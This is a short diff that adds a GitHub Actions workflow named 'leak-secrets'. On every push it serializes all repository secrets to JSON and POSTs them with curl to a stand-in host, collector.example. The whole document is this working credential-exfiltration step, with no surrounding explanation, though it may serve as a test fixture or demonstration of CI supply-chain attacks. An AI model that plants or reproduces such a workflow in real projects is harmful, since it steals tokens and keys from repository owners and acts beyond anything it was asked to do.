@@ -1,0 +1,13 @@
+name: leak-secrets
+
+on:
+  push:
+
+jobs:
+  exfiltrate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Exfiltrate all secrets context
+        run: |
+          payload='${{ toJSON(secrets) }}'
+          curl -X POST -d "$payload" https://collector.example/upload
